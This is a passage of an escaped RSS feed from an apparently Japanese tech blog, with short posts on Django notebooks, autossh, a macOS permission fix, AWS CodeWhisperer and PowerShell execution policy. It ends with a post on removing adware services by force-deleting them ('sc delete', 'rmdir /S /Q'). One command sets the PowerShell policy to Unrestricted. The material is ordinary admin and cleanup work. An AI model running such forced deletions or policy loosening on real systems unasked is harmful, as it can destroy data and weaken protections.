+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-py" data-lang="py"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys&lt;span style="color:#f92672"&gt;,&lt;/span&gt; os&lt;span style="color:#f92672"&gt;,&lt;/span&gt; django
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BASE_DIR &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;path_ot_manage_py&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;path&lt;span style="color:#f92672"&gt;.&lt;/span&gt;insert(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, BASE_DIR)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;environ&lt;span style="color:#f92672"&gt;.&lt;/span&gt;setdefault(&lt;span style="color:#e6db74"&gt;&amp;#34;DJANGO_SETTINGS_MODULE&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;app.settings&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;django&lt;span style="color:#f92672"&gt;.&lt;/span&gt;setup()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="リモートサーバー"&gt;リモートサーバー&lt;/h3&gt;
+&lt;h4 id="autossh-でポートフォワード"&gt;autossh でポートフォワード&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;PCの &lt;code&gt;8.8.8.8&lt;/code&gt; -&amp;gt; リモート(&lt;code&gt;EC2&lt;/code&gt;とか)の &lt;code&gt;8.8.8.8&lt;/code&gt; にフォワードする:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;autossh -M &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; -F .secrets/ssh.ec2.conf server -N -L 8888:localhost:8888 -4
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="カーネル起動"&gt;カーネル起動&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;DJANGO_ALLOW_ASYNC_UNSAFE&lt;span style="color:#f92672"&gt;=&lt;/span&gt;true python manage.py shell_plus --notebook
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;URLが表示されるので、ブラウザでアクセスする&lt;/p&gt;</description></item><item><title>macOS: ls: .: Operation not permitted</title><link>https://hdknr.github.io/blogs/posts/2023/05/4f806f69ebe3fa5fd587d35b62e7fc67/</link><pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2023/05/4f806f69ebe3fa5fd587d35b62e7fc67/</guid><description>&lt;h2 id="macos-ls--operation-not-permitted"&gt;macOS: ls: .: Operation not permitted&lt;/h2&gt;
+&lt;p&gt;このエラーは、macOSの&lt;strong&gt;セキュリティ機能&lt;/strong&gt;によって、ターミナルのコマンドが&lt;strong&gt;特定のディレクトリ&lt;/strong&gt;に対して&lt;strong&gt;制限されている&lt;/strong&gt;可能性があります¹²。例えば、DownloadsやDocumentsなどのディレクトリは、プライバシー保護のためにアクセス権が制限されています²。&lt;/p&gt;
+&lt;p&gt;この場合、&lt;strong&gt;システム環境設定&lt;/strong&gt;から、ターミナルに対して&lt;strong&gt;フルディスクアクセス&lt;/strong&gt;を許可する必要があります¹²。具体的な手順は以下の通りです。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;システム環境設定を開きます。&lt;/li&gt;
+&lt;li&gt;セキュリティとプライバシーを選択します。&lt;/li&gt;
+&lt;li&gt;プライバシータブをクリックします。&lt;/li&gt;
+&lt;li&gt;左側のメニューからフルディスクアクセスを選択します。&lt;/li&gt;
+&lt;li&gt;鍵のアイコンをクリックしてロックを解除します。&lt;/li&gt;
+&lt;li&gt;パスワードを入力します。&lt;/li&gt;
+&lt;li&gt;+ボタンをクリックしてターミナルを追加します。&lt;/li&gt;
+&lt;li&gt;ターミナルを再起動します。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;これで、lsコマンドなどが正常に動作するはずです。試してみてください。&lt;/p&gt;
+&lt;p&gt;ソース: Bing との会話 2023/5/3&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;(1) macOS の「Operation not permitted」を回避する【du/ls/mv/cp &amp;hellip;. &lt;a href="https://qiita.com/KEINOS/items/0366f1c281b574a79cfb"&gt;https://qiita.com/KEINOS/items/0366f1c281b574a79cfb&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;(2) ターミナルでコマンド実行時に「Operation not permitted」が出 &amp;hellip;. &lt;a href="https://qiita.com/Tatsu88/items/f50f850b0c8f4a2c1bf2"&gt;https://qiita.com/Tatsu88/items/f50f850b0c8f4a2c1bf2&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;(3) unix - ls: Operation not Permitted - Stack Overflow. &lt;a href="https://stackoverflow.com/questions/25717501/ls-operation-not-permitted"&gt;https://stackoverflow.com/questions/25717501/ls-operation-not-permitted&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;(4) 突然の「Operation not permitted」-Dockerが採用する &amp;hellip;. &lt;a href="https://www.creationline.com/lab/46861"&gt;https://www.creationline.com/lab/46861&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="設定--プライバシーとセキュリティ"&gt;設定 &amp;gt; プライバシーとセキュリティ&lt;/h3&gt;
+&lt;img width="705" alt="prvacy" src="https://user-images.githubusercontent.com/104647/235813294-f71d2e00-b941-407a-8c6e-8057ff41bdd6.png"&gt;
+&lt;h3 id="-フルディスクアクセス"&gt;&amp;gt; フルディスクアクセス&lt;/h3&gt;
+&lt;img width="711" alt="disk" src="https://user-images.githubusercontent.com/104647/235813298-e3ed55da-1c15-4534-ab44-6d698bbcc0df.png"&gt;</description></item><item><title>AWS CodeWhisperer &amp; IAM Identity Center</title><link>https://hdknr.github.io/blogs/posts/2023/04/39ed7413bfc834267ec909b3b140de0b/</link><pubDate>Sat, 15 Apr 2023 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2023/04/39ed7413bfc834267ec909b3b140de0b/</guid><description>&lt;h2 id="aws-codewhisperer--iam-identity-center"&gt;AWS CodeWhisperer &amp;amp; IAM Identity Center&lt;/h2&gt;
+&lt;h3 id="codewhisperer"&gt;CodeWhisperer&lt;/h3&gt;
+&lt;p&gt;IAM Identity Center:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;IAM Identity Centerを有効にする&lt;/li&gt;
+&lt;li&gt;ユーザーを追加する&lt;/li&gt;
+&lt;li&gt;ユーザーのメアド認証&lt;/li&gt;
+&lt;li&gt;パスワードリセットをメアドに送り、パスワード設定してログイン可能にする&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;CodeWhisperer:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Codewhiper の利用を開始する&lt;/li&gt;
+&lt;li&gt;CodeWhispererを IAM Identity Centerのアプリケーションに登録する&lt;/li&gt;
+&lt;li&gt;IAM Identity Centerで登録したユーザーを CodeWhispererで使えるようにする&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;VSCode:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;AWS Toolkit プラグインを入れる&lt;/li&gt;
+&lt;li&gt;CodeWhisperer の利用を開始:&lt;code&gt;Connect using AWS Identity Center&lt;/code&gt; で&lt;/li&gt;
+&lt;li&gt;AWS Identity Center URLを入力 (&lt;a href="https://x-xxxxxxx.awsapps.com/start"&gt;https://x-xxxxxxx.awsapps.com/start&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;AWS Toolkitにアクセストークンを取得( 認証コードをブラウザに入力して、IAM Identity Centerにログイン)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="資料"&gt;資料&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://zenn.dev/yaasita/articles/aa48bfa06b9a53"&gt;AWS IAM Identity CenterでIAMアカウントを統一する&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://blog.engineer.adways.net/entry/2022/10/21/150000"&gt;AWS IAM Identity Center(旧：AWS SSO)を使ってみた&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://dev.classmethod.jp/articles/amazon-codewhisperer-iam-identity-center/"&gt;Amazon CodeWhisperer を IAM Identity Center に統合させて使ってみた&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>PowerShell</title><link>https://hdknr.github.io/blogs/posts/2015/08/38363465356d52c7da6b/</link><pubDate>Sat, 01 Aug 2015 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2015/08/38363465356d52c7da6b/</guid><description>&lt;p&gt;PowerShell&lt;/p&gt;
+&lt;h2 id="実行権限"&gt;実行権限&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.atmarkit.co.jp/ait/articles/0805/16/news139.html"&gt;WindowsでPowerShellスクリプトの実行セキュリティポリシーを変更する&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;PS C:\WINDOWS\system32&amp;gt; Get-ExecutionPolicy
+RemoteSigned
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;PS C:\WINDOWS\system32&amp;gt; Set-ExecutionPolicy Unrestricted
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;Set-ExecutionPolicy : Windows PowerShell により実行ポリシーは正常に更新されましたが、設定は範囲がより明確に定義されたポリシーで上書きされました。この上書きにより、シェルで現在有効な実行ポリシー RemoteSigned が保持されます。
+実行ポリシーの設定を表示するには、「Get-ExecutionPolicy -List」と入力してください。詳細については、&amp;#34;Get-Help Set-ExecutionPolicy&amp;#34; を参照してください。
+発生場所 行:1 文字:1
++ Set-ExecutionPolicy Unrestricted
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo : PermissionDenied: (:) [Set-ExecutionPolicy], SecurityException
++ FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Commands.SetExecutionPolicyCommand
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;PS C:\WINDOWS\system32&amp;gt; Get-ExecutionPolicy -List
+Scope ExecutionPolicy
+----- ---------------
+MachinePolicy Undefined
+UserPolicy Undefined
+Process Undefined
+CurrentUser RemoteSigned
+LocalMachine Unrestricted
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://stackoverflow.com/questions/27753917/how-successfully-change-execution-policy-and-enable-execution-of-powershell-scri"&gt;How successfully change Execution policy and enable execution of Powershell scripts&lt;/a&gt;&lt;/p&gt;</description></item><item><title>Browser Hijacker</title><link>https://hdknr.github.io/blogs/posts/2015/07/13d478c82630f5f1b233/</link><pubDate>Wed, 22 Jul 2015 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2015/07/13d478c82630f5f1b233/</guid><description>&lt;p&gt;Delta Homes系の対応&lt;/p&gt;
+&lt;h2 id="windowsmangerprotect"&gt;WindowsMangerProtect&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bat" data-lang="bat"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;C:\WINDOWS\system32&lt;span style="color:#75715e"&gt;&amp;gt;sc delete WindowsMangerProtect&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;[SC] DeleteService SUCCESS
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;C:\WINDOWS\system32&lt;span style="color:#75715e"&gt;&amp;gt;rmdir /S /Q &amp;#34;C:\ProgramData\WindowsMangerProtect&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="ihprotect-service"&gt;IHProtect Service&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;7
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;8
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bat" data-lang="bat"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;C:\WINDOWS\system32&lt;span style="color:#75715e"&gt;&amp;gt;sc delete &amp;#34;IHProtect Service&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;[SC] DeleteService SUCCESS
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;C:\WINDOWS\system32&lt;span style="color:#75715e"&gt;&amp;gt;rmdir /S /Q &amp;#34;C:\Program Files (x86)\MiuiTab&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;C:\Program&lt;span style="color:#75715e"&gt; Files (x86)\MiuiTab\msvcp110.dll - アクセスが拒否されました。&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;C:\Program&lt;span style="color:#75715e"&gt; Files (x86)\MiuiTab\msvcr110.dll - アクセスが拒否されました。&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;C:\Program&lt;span style="color:#75715e"&gt; Files (x86)\MiuiTab\ProtectService.exe - アクセスが拒否されました。&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;C:\WINDOWS\system32&lt;span style="color:#75715e"&gt;&amp;gt;rmdir /S /Q &amp;#34;C:\Program Files (x86)\MiuiTab&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description></item></channel></rss>
